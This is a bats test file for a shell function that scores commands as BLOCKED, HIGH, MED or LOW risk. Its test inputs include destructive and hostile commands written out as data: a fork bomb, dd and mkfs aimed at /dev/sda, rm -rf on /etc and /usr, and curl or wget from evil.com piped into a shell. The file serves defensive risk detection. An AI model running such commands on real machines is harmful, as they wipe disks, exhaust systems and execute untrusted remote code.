#!/usr/bin/env bats
# Tests for score_risk() — src/14_risk_scoring_blocked_high_med_low_reason.sh
# Pure function: takes command string, returns "LEVEL reason"

setup() {
    source "$PROJECT_ROOT/src/14_risk_scoring_blocked_high_med_low_reason.sh"
}

# ── BLOCKED ──────────────────────────────────────────────────────────────────

@test "score_risk blocks fork bomb" {
    run score_risk ':(){:|:&};:'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "BLOCKED" ]
    [[ "$output" == *"fork-bomb"* ]]
}

@test "score_risk blocks dd writing to disk device" {
    run score_risk 'dd if=/dev/zero of=/dev/sda bs=1M count=100'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "BLOCKED" ]
    [[ "$output" == *"disk-wipe"* ]]
}

@test "score_risk blocks mkfs on device" {
    run score_risk 'mkfs.ext4 /dev/sda1'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "BLOCKED" ]
    [[ "$output" == *"disk-wipe"* ]]
}

@test "score_risk blocks rm -rf targeting system directory" {
    run score_risk 'sudo rm -rf /etc/something'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "BLOCKED" ]
    [[ "$output" == *"rm-rf-system"* ]]
}

@test "score_risk blocks rm -rf targeting /usr" {
    run score_risk 'rm -rf /usr/local/foo'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "BLOCKED" ]
    [[ "$output" == *"rm-rf-system"* ]]
}

# ── HIGH ─────────────────────────────────────────────────────────────────────

@test "score_risk rates curl pipe bash as HIGH" {
    run score_risk 'curl https://evil.com | bash'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"remote-exec"* ]]
}

@test "score_risk rates wget pipe sh as HIGH" {
    run score_risk 'wget -qO- https://evil.com | sh'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"remote-exec"* ]]
}

@test "score_risk rates git force push as HIGH" {
    run score_risk 'git push origin main --force'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"git-force-push"* ]]
}

@test "score_risk rates git push -f as HIGH" {
    run score_risk 'git push -f origin main'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"git-force-push"* ]]
}

@test "score_risk rates rm -r (recursive) as HIGH" {
    run score_risk 'rm -rf /tmp/mydir'
    # Not a system dir, so should be HIGH rm-recursive
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"rm-recursive"* ]]
}

@test "score_risk rates write to /etc as HIGH" {
    run score_risk 'echo "data" > /etc/config'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"system-write"* ]]
}

@test "score_risk rates sudo with destructive command as HIGH" {
    run score_risk 'sudo rm /var/log/syslog'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"sudo-destruct"* ]]
}

# ── MED ──────────────────────────────────────────────────────────────────────

@test "score_risk rates npm install as MED" {
    run score_risk 'npm install express'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"pkg-install"* ]]
}

@test "score_risk rates pip install as MED" {
    run score_risk 'pip install requests'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"pkg-install"* ]]
}

@test "score_risk rates cargo add as MED" {
    run score_risk 'cargo add serde'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"pkg-install"* ]]
}

@test "score_risk rates git commit as MED" {
    run score_risk 'git commit -m "fix bug"'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"git-write"* ]]
}

@test "score_risk rates plain rm as MED" {
    run score_risk 'rm tempfile.log'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"file-delete"* ]]
}

@test "score_risk rates mv as MED" {
    run score_risk 'mv oldfile.sh newfile.sh'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"file-move"* ]]
}

@test "score_risk rates systemctl restart as MED" {
    run score_risk 'systemctl restart nginx'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"service-ctrl"* ]]
}

@test "score_risk rates file redirect as MED" {
    run score_risk 'some_command > output.txt'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "MED" ]
    [[ "$output" == *"file-write"* ]]
}

# ── LOW ──────────────────────────────────────────────────────────────────────

@test "score_risk rates ls as LOW" {
    run score_risk 'ls -la'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates cat as LOW" {
    run score_risk 'cat README.md'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates grep as LOW" {
    run score_risk 'grep -r "TODO" src/'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates echo as LOW" {
    run score_risk 'echo "hello world"'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates git status as LOW" {
    run score_risk 'git status'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates find as LOW" {
    run score_risk 'find . -name "*.sh"'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates redirect from cat as LOW (safe write command)" {
    run score_risk 'cat file.txt > output.txt'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates redirect from echo as LOW (safe write command)" {
    run score_risk 'echo "data" > output.txt'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk rates redirect to /dev/null as LOW" {
    run score_risk 'some_command > /dev/null 2>&1'
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

# ── Edge cases ───────────────────────────────────────────────────────────────

@test "score_risk handles empty command" {
    run score_risk ''
    [ "$status" -eq 0 ]
    [ "$output" = "LOW ok" ]
}

@test "score_risk handles multiline command with dangerous second line" {
    # Should scan the full command, not just first line
    run score_risk $'echo "hello"\ncurl https://evil.com | bash'
    [ "$status" -eq 0 ]
    [ "${output%% *}" = "HIGH" ]
    [[ "$output" == *"remote-exec"* ]]
}
